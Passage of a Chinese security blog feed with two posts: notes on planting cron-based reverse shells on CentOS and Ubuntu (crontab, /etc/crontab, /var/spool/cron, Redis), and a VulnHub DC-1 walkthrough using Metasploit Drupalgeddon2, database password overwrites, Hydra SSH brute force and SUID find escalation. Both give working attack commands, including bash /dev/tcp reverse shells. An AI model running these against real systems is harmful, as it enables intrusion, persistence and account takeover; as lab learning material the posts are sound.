href="#法四：echo写入命令和文件到-etc-crontab" class="headerlink" title="法四：echo写入命令和文件到&#x2F;etc&#x2F;crontab"></a>法四：echo写入命令和文件到&#x2F;etc&#x2F;crontab</h3><p>在<code>/etc/crontab</code>这个文件中，已经有了官方的介绍</p><p><img src="http://pic.bamboo22.top/image-20230624213327531.png"></p><p>可以看到命令里面必须要添加用户名，才能反弹成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;*/1 * * * * root bash -i &gt;&amp; /dev/tcp/192.168.144.128/1111 0&gt;&amp;1&#x27; &gt; /etc/crontab</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230624214417091.png"></p><h2 id="Ubuntu计划任务反弹shell"><a href="#Ubuntu计划任务反弹shell" class="headerlink" title="Ubuntu计划任务反弹shell"></a>Ubuntu计划任务反弹shell</h2><p>Ubuntu和kali都是基于dibian，我们之前已经知道了不能用CentOS的方法，下面就探究一下Ubuntu上应该如何操作</p><h3 id="法一：crontab-e写入命令-1"><a href="#法一：crontab-e写入命令-1" class="headerlink" title="法一：crontab -e写入命令"></a>法一：crontab -e写入命令</h3><p><code>crontab -e</code>时提示选择编辑器，然后写入之前的计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.144.128/1111 0&gt;&amp;1:</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627202629918.png"></p><p>当然是没有反弹成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -15 /var/log/syslog</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(CRON) info (No MTA installed, discarding output)</span><br><span class="line">#(计划任务)信息(没有邮件系统，放弃输出)</span><br></pre></td></tr></table></figure><p>Ubuntu系统默认会将计划任务的错误信息以邮件的方式发送给用户，但是由于Ubuntu系统默认没有安装邮件系统，所以真正的报错信息被<code>discarding output</code>(被舍弃)了，而不是<code>No MTA installed，discarding output</code>这句话。</p><p><strong>寻找真正的错误信息:</strong></p><p>想看到真正的报错信息有两种解决办法：</p><p>1.安装邮件系统，这个方法就算了，没必要。</p><p>2.将计划任务的错误信息输出到一个文件内，那么需要我们修改一下计划任务如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">* * * * * bash -i  &#x27;&gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1&#x27;&gt;/tmp/error.txt 2&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627201537183.png"></p><p>真正的报错信息了：**&#x2F;bin&#x2F;bash没有找到**</p><p>我们去<code>/etc/crontab</code>里面看一下，发现没有bash，只有一个&#x2F;bin&#x2F;sh,换句话说<code>ubuntu</code>的<code>cron</code>中命令执行的shell环境是<code>/bin/sh</code>。</p><p><img src="http://pic.bamboo22.top/image-20230627204204257.png"></p><h4 id="sh与dash"><a href="#sh与dash" class="headerlink" title="sh与dash"></a>sh与dash</h4><p>那么这里来找一下到底<code>/bin/sh</code>是什么，如下图可以看出，<code>sh</code>其实是指向<code>dash</code>的一个软连接。而dash是什么呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /bin/ | grep -w &quot;sh&quot;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627204122881.png"></p><p>综合网上查询的信息得出个结论：Debian和Ubuntu中，&#x2F;bin&#x2F;sh默认已经指向dash，dash比bash体积小速度快，兼容性高。<strong>dash主要是为了执行脚本而出现，所以不能实现交互</strong>，功能相比bash要少很多，语法严格遵守POSIX标准。</p><h4 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h4><p>在ubuntu系统上执行<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>无法直接反弹shell是因为ubuntu系统打开的终端默认是<code>sh</code>运行的命令，而sh刚才也提到了，实际上就是dash。dash只能够进行脚本的运行，而<code>bash -i</code>这个命令，使用到了bash交互的功能，所以sh不能在实现交互，也就反弹失败了。</p><p><img src="http://pic.bamboo22.top/image-20230627204448457.png"></p><p>如果我在ubuntu默认的终端中输入<code>bash</code>就会切换到<code>bash</code>终端，进而就可以使用<code>bash -i</code>了</p><p>又或者我是用<code>bash -c</code>，没有用到<code>bash</code>交互功能，也可以使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627205517640.png"></p><p>这样就能连接成功了</p><p>回到刚刚那儿，写入的内容，不能是bash -i开头的bash反弹，而应该是bash -c即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">* * * * * bash -c &quot;bash -i &gt;&amp; /dev/tcp/kali_ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627205118643.png"></p><p>成功</p><h3 id="法二：echo写入文件-1"><a href="#法二：echo写入文件-1" class="headerlink" title="法二：echo写入文件"></a>法二：echo写入文件</h3><p>下面这种按理也能弹shell，但是尝试后发现失败，这也是坑点之一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /tmp/1.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.144.130/1111 0&gt;&amp;1</span><br><span class="line">echo &quot;*/1 * * * * bash /tmp/1.sh&quot; &gt;&gt; /var/spool/cron/crontabs/root #ubuntu的计划任务路径目录为/var/spool/cron/crontabs/</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627210606653.png"></p><p><strong>因为我们echo创建的root文件，默认权限是644，ubuntu这里规定，计划任务root文件的权限必须是600！</strong></p><p>修改权限的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 root        修改权限为600</span><br><span class="line">systemctl restart cron      再重启</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230628111835358.png"></p><p>修改之后瞬间成功</p><p><img src="http://pic.bamboo22.top/image-20230628111813314.png"></p><h3 id="法三：crontab-e写入文件-1"><a href="#法三：crontab-e写入文件-1" class="headerlink" title="法三：crontab -e写入文件"></a>法三：crontab -e写入文件</h3><blockquote><p><strong>通过命令crontab -e来创建的计划任务生成的root文件，默认就是600权限！</strong></p></blockquote><p>所以不需要修改，和之前的操作差不多，就不赘述了</p><h3 id="法四：echo写入命令和文件到-etc-crontab-1"><a href="#法四：echo写入命令和文件到-etc-crontab-1" class="headerlink" title="法四：echo写入命令和文件到&#x2F;etc&#x2F;crontab"></a>法四：echo写入命令和文件到&#x2F;etc&#x2F;crontab</h3><p>直接<strong>贴上总结和优化后的代码</strong>，在渗透的时候，请先备份一下<code>/etc/crontab</code>文件，然后再添加命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#新建一个.sh文件并加执行权限</span><br><span class="line">touch /tmp/test.sh</span><br><span class="line">chmod +x /tmp/test.sh</span><br><span class="line"> </span><br><span class="line">vim /etc/crontab </span><br><span class="line">#写一个sh脚本</span><br><span class="line">echo &quot;#\!/bin/bash&quot; &gt;&gt; /tmp/test.sh</span><br><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.144.130/1111 0&gt;&amp;1&quot; &gt;&gt; /tmp/test.sh</span><br><span class="line"> </span><br><span class="line">#sed命令必须是单引号,-i就是修改;$在正则中表示最后一行,a表示在指定行下边插入指定的内容行,$a就是在最后一行插入。</span><br><span class="line">sed -i &#x27;$a*/1 * * * * root bash /tmp/test.sh&#x27; /etc/crontab</span><br><span class="line"> </span><br><span class="line">#d表示删除，$d即删除最后一行，也就是刚刚添加的命令</span><br><span class="line">sed -i &#x27;$d&#x27; /etc/crontab</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230627211432881.png"></p><p><img src="http://pic.bamboo22.top/image-20230627211416034.png"></p><h2 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h2><ol><li><p><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>为什么在ubuntu默认终端上反弹shell没有用？而在centos上就行？</p></li><li><p>为什么在ubuntu系统上把上述命令写入脚本运行就可以反弹shell了？</p><p>问题1、2答：<code>ubuntu</code>终端默认启用<code>sh</code>，而<code>sh</code>指向的是<code>dash shell</code>，不具备交互功能，只具备脚本运行的功能</p></li><li><p>centos与ubuntu的计划任务有哪些不同？</p><ul><li><p>ubuntu的用户计划任务目录在<code>/var/spool/cron/crontabs/</code>，centos在<code>/var/spool/cron/</code></p></li><li><p>ubuntu用户计划任务文件必须是600权限</p></li></ul></li><li><p>&#x2F;etc&#x2F;cron与&#x2F;var&#x2F;spool&#x2F;cron有啥区别？</p><ul><li>是系统级别的计划任务文件；&#x2F;var&#x2F;spool&#x2F;cron是用户级别的</li></ul><ul><li>echo写入命令到&#x2F;etc&#x2F;cron时，不影响其权限，适用于docker特权逃逸</li></ul></li><li><p>ubuntu直接编辑<code>/var/spool/cron/crontabs/root</code>文件设置<code>root</code>的计划任务是无法成功的，因为文件的权限不是0600。设置的时候尽量使用<code>crontab -e</code>命令，或者写入<code>/etc/crontab</code>里面；如果在渗透时用不了<code>crontab -e</code>命令，可使用法四。<strong>至于centos的话，任何方法均可，不受影响。</strong></p></li></ol><h2 id="Ubuntu中redis计划任务"><a href="#Ubuntu中redis计划任务" class="headerlink" title="Ubuntu中redis计划任务"></a>Ubuntu中redis计划任务</h2><p>最后回到一开始的问题，Ubuntu中redis计划任务不能成功的原因有：</p><ol><li>Ubuntu默认shell环境不是bash而是dash</li><li>Ubuntu计划任务的路径与centOS不同</li><li>root文件权限不为600</li><li>redis写入文件有时有乱码</li></ol><p>其中前三个问题都可以解决，最后一个问题我在Ubuntu上手动删除了乱码后成功，但是真实情况应该不怎么用的上</p><p>将dash改为bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s -f /bin/bash /bin/sh</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230630161936876.png"></p><p><img src="http://pic.bamboo22.top/image-20230630161750252.png"></p><p>参考大佬的文章：<a href="https://mp.weixin.qq.com/s?__biz=MzIyMzcwMTg1MA==&mid=2247486475&idx=1&sn=1518e6bc38cd2a10d78d5711fdb8fd57&chksm=e81b723edf6cfb287f556e2bc7e5dcfb6ed31810abd3e272ed05606bacacfea6b428dad6fa85&mpshare=1&scene=23&srcid=0624ojOQzDE3mIEWT6uPyMMm&sharer_sharetime=1687605892910&sharer_shareid=887ca9bd754f6319a7972e14913173ae#rd">底层原理 | Linux计划任务反弹shell探究 </a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/01/22/DC%E9%9D%B6%E5%9C%BA/"/>
      <url>/2024/01/22/DC%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="DC靶场"><a href="#DC靶场" class="headerlink" title="DC靶场"></a>DC靶场</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官网下载链接<a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></p><p>下载后用vmware打开这个.ova文件</p><p><img src="http://pic.bamboo22.top/image-20230711203603065.png"></p><p>按照提示安装，成功以后就是这个登录界面</p><p><img src="http://pic.bamboo22.top/image-20230711203811141.png"></p><p>渗透的目标就是拿到密码登录</p><p>注意这里我是用到NAT模式，保证靶机和攻击机在同一网段</p><h2 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h2><p>来到第一关，我们用kali做攻击机，DC-1为靶机</p><p> <img src="http://pic.bamboo22.top/image-20230711204226711.png"></p><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><h4 id="1-探测目标IP地址"><a href="#1-探测目标IP地址" class="headerlink" title="1.探测目标IP地址"></a>1.探测目标IP地址</h4><p>探测当前网段下的IP</p><p>探测主机的工具有很多，常见的有arp-scan、nmap还有netdiscover</p><ul><li>arp-scan</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711210016700.png"></p><p>可以看到同一网段上的所有IP</p><p><img src="http://pic.bamboo22.top/image-20230711205948433.png"></p><p>查看靶机的MAC地址，现在可以确定靶机的ip为<strong>192.168.85.130</strong></p><ul><li>也可以用<strong>nmap</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.85</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">    </span><br><span class="line">ip后面改为了<span class="number">0</span>/<span class="number">24</span>, 在这里“<span class="number">192.168</span><span class="number">.85</span><span class="number">.0</span>/<span class="number">24</span>”表示的是这个网段的IP地址从从<span class="number">192.168</span><span class="number">.85</span><span class="number">.1</span>开始，到<span class="number">192.168</span><span class="number">.85</span><span class="number">.254</span>结束（<span class="number">192.168</span><span class="number">.85</span><span class="number">.0</span>和<span class="number">192.168</span><span class="number">.85</span><span class="number">.255</span>有特殊含义不能当做ip地址）；子网掩码是<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711210451146.png"></p><p>同样也能扫出IP</p><ul><li>还有<strong>netdiscover</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711210759153.png"></p><h4 id="2-探测目标IP开放端口"><a href="#2-探测目标IP开放端口" class="headerlink" title="2.探测目标IP开放端口"></a>2.探测目标IP开放端口</h4><p>用nmap探测</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- <span class="number">192.168</span><span class="number">.85</span><span class="number">.130</span></span><br><span class="line"></span><br><span class="line">-sV  扫描目标主机端口上运行的软件信息</span><br><span class="line">-p-  扫描全部端口<span class="number">0</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711211401150.png"><br>可以看到开放的端口有：<strong>22、80、111、48080</strong></p><p>20和80端口是我们的突破口，80是http协议，我们用浏览器访问一下看看</p><h4 id="3-网页信息收集"><a href="#3-网页信息收集" class="headerlink" title="3.网页信息收集"></a>3.网页信息收集</h4><p>访问<strong>192.168.85.130</strong></p><p><img src="http://pic.bamboo22.top/image-20230711212034890.png"></p><p>可以用Firefox的插件看到站点信息是 <strong>Drupal</strong></p><p>也可以用kali自带的工具<strong>whatweb</strong>扫</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v <span class="number">192.168</span><span class="number">.85</span><span class="number">.130</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711212623130.png"></p><p>接下来用dirsearch扫网站目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.85.130 -e *</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711214112802.png"><br>东西挺多的，先放着</p><p>得到如下信息：</p><ul><li>CMS是Drupal</li><li>Apache 2.2.22</li><li>PHP 5.4.45</li><li>jQuery 1.4.4</li></ul><hr><h3 id="二、漏洞查找与利用"><a href="#二、漏洞查找与利用" class="headerlink" title="二、漏洞查找与利用"></a>二、漏洞查找与利用</h3><p>知道cms，我们一般从cms出发找漏洞，百度一下drupal漏洞 </p><p><img src="http://pic.bamboo22.top/image-20230711215805702.png"></p><p>有框架漏洞</p><h4 id="1-漏洞查找"><a href="#1-漏洞查找" class="headerlink" title="1.漏洞查找"></a>1.漏洞查找</h4><p>用工具Metasploit（目前世界上领先的渗透测试工具，也是信息安全与渗透测试领域最大的开源项目之一），先找下漏洞，先打开工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole    启动</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711220101903.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search Drupal       搜索Drupal漏洞</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711220721820.png"><br>可以看到这个cms框架还是有挺多漏洞的，这里我们利用漏洞等级较高的，且时间最新的18年那个漏洞</p><h4 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h4><p>利用18年那个洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711221221882.png"></p><p>接着看一下该漏洞模块参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711221437925.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Current Setting是目前设置的内容</span><br><span class="line">Required表示是否需要设置内容，yes为必须设置，no可以设置也可不设置</span><br><span class="line">就上面来说RHOSTS需要set，但是没有内容</span><br></pre></td></tr></table></figure><p>所以接着我们来设置一下RHOSTS内容（就是攻击目标IP地址，靶场地址）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS <span class="number">192.168</span><span class="number">.85</span><span class="number">.130</span></span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711221743947.png"></p><p>设置完后就可以看到RHOSTS有ip了</p><p>设置完后开始攻击</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit  或者run</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230711222048595.png"></p><p>出现Meterpreter session 1 opened（kali和目标ip的连接）就说明攻击成功啦，接下来我们可以getshell了</p><h3 id="三、getshell"><a href="#三、getshell" class="headerlink" title="三、getshell"></a>三、getshell</h3><h4 id="普通shell"><a href="#普通shell" class="headerlink" title="普通shell"></a>普通shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p>可以执行命令</p><p><img src="http://pic.bamboo22.top/image-20230712114021928.png"></p><h4 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h4><p>用python脚本获取交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>但是这个要靶机上有python才行</p><p><img src="http://pic.bamboo22.top/image-20230712130841566.png"></p><p>看到一个flag1.txt，查看一下</p><p><img src="http://pic.bamboo22.top/image-20230712114555874.png"></p><p>看到Every good CMS needs a config file - and so do you.这个提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag*      查看还有哪些叫flag的文件</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712114856925.png"></p><p>没有了</p><p>刚刚提示说的配置文件，搜索drupal配置文件存放路径为 sites&#x2F;default&#x2F;settings.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat sites/default/settings.php</span><br></pre></td></tr></table></figure><p>也可以知道是setting.php,用命令直接搜索并打开，内联执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat `find / -name settings.php`</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712115410723.png"></p><p>看到flag2中有提示，提到证书有什么用先放一放吧</p><p><img src="http://pic.bamboo22.top/image-20230712115936119.png"></p><p>还看到了一个数据库，有账号和密码，那么就可以尝试登录进去看看</p><h3 id="四、数据库渗透"><a href="#四、数据库渗透" class="headerlink" title="四、数据库渗透"></a>四、数据库渗透</h3><p>我们用刚刚拿到的数据库账号密码登录，注意这里必须是交互式shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712131033943.png"></p><p>进入drupaldb这个数据库，看看里面的数据</p><p><img src="http://pic.bamboo22.top/image-20230712133008708.png"></p><p>发现有两个user的表</p><p><img src="http://pic.bamboo22.top/image-20230712133119123.png"></p><p>查一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712133334634.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |</span><br><span class="line"></span><br><span class="line">| Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |</span><br></pre></td></tr></table></figure><p>密码比较复杂，应该不是明文，那想登进后台就很难了，我们可以通过修改admin的密码，或者是新加一个admin</p><p><a href="https://drupalchina.cn/node/2128">分享：忘记Drupal的管理员密码的解决办法 | Drupal China</a></p><p><strong>法一：修改admin密码</strong></p><p>我们得先找到加密文件，Drupal的加密脚本在<code>/var/www/scripts/password-hash.sh</code></p><p>目录下，我们先用exit退出mysql</p><p><img src="http://pic.bamboo22.top/image-20230712134316624.png"></p><p>这个脚本是用php写的，而且还能用php加参数运行，直接得到加密后的密码，这里我们设置一个密码123456 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php /var/www/scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712134414016.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password:123456</span><br><span class="line">hash: $S$D57b7lreyHHd9YxLVFT.mAZvE1O.QSaAIdQ98Hl0gccSpRpx0Br/</span><br></pre></td></tr></table></figure><p>得到加密后的密码， 接着我们登入mysql修改一下admin跟Fred的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"></span><br><span class="line">use drupaldb;update users set pass = &quot;$S$D1UQvb3x7lKoCSX6S9K.r.wB202Lsa/r7fkOj7CelJsSEMFDJjGv&quot; where name = &#x27;admin&#x27; or name = &#x27;Fred&#x27;;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712134857654.png"></p><p>修改成功</p><p><strong>法二：添加admin权限用户</strong> </p><p>drupal7版本在有个SQL注入的漏洞，可以添加一个admin权限的用户，适用版本7.31以下，我们可以在msf找一下这个工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit drupal               </span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712135304493.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 34992.py -p</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712135403150.png"></p><p>可以去这个链接里面找脚本</p><p>接下来我们就用修改好的密码登录，在右上角的content中找到flag3</p><p><img src="http://pic.bamboo22.top/image-20230712135735109.png"></p><p>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p><p>提示了我们一些信息passwd和shadow，明显就是linux的文件</p><blockquote><p>&#x2F;etc&#x2F;passwd</p><p>该文件存储了系统用户的基本信息，所有用户都可以对其进行文件操作读</p><p><a href="http://c.biancheng.net/view/839.html">Linux &#x2F;etc&#x2F;passwd内容解释（超详细） (biancheng.net)</a></p><p>&#x2F;etc&#x2F;shadow</p><p>该文件存储了系统用户的密码等信息，只有root权限用户才能读取</p><p><a href="http://c.biancheng.net/view/840.html">Linux &#x2F;etc&#x2F;shadow（影子文件）内容解析（超详细） (biancheng.net)</a></p></blockquote><p><img src="http://pic.bamboo22.top/image-20230712140610272.png"></p><p>看到flag4，我们有两个方法拿到这个用户的密码，一个是爆破，另一个就是提权打开shadow文件查看密码</p><h3 id="五、用户密码爆破"><a href="#五、用户密码爆破" class="headerlink" title="五、用户密码爆破"></a>五、用户密码爆破</h3><p>事先参考SSH</p><p><a href="https://blog.csdn.net/li528405176/article/details/82810342?ops_request_misc=%7B%22request_id%22:%22165642658616782388078059%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=165642658616782388078059&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-82810342-null-null.142%5Ev24%5Econtrol,157%5Ev15%5Enew_3&utm_term=SSH&spm=1018.2226.3001.4187">SSH简介及两种远程登录的方法_ssh -CSDN博客</a></p><p>利用工具Hydra爆破flag4的密码</p><p><a href="http://www.ha97.com/5186.html">（总结）Linux下的暴力密码在线破解工具Hydra详解 (ha97.com)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.85.130</span><br></pre></td></tr></table></figure><p>用hydra爆破</p><p><img src="http://pic.bamboo22.top/image-20230712141634364.png"></p><p>爆破出密码为orange，然后我们用kali连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh flag4@192.168.85.130</span><br></pre></td></tr></table></figure><p>输入orange登录成功</p><p><img src="http://pic.bamboo22.top/image-20230712142806332.png"><br><img src="http://pic.bamboo22.top/image-20230712142935462.png"></p><p>拿到flag4</p><h3 id="六、-Linux提权"><a href="#六、-Linux提权" class="headerlink" title="六、 Linux提权"></a>六、 Linux提权</h3><p>需要用到SUID提权，参考<a href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权 - FreeBuf网络安全行业门户</a></p><p>利用find命令，找查具有SUID权限的可执行二进制文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712143506711.png"></p><p>find比较常用，可以执行root权限的命令找查文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -name index.php -exec &quot;/bin/sh&quot; \;</span><br><span class="line"></span><br><span class="line">这里找查什么文件不重要（但是是存在的文件），只需要格式对，然后后面加上-exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230712143644895.png"></p><p>成功提权，最后来找第五个flag</p><p><img src="http://pic.bamboo22.top/image-20230712143832624.png"></p><p>成功通关！</p>]]></content>
      
      
      
    </entry>
    
    
    
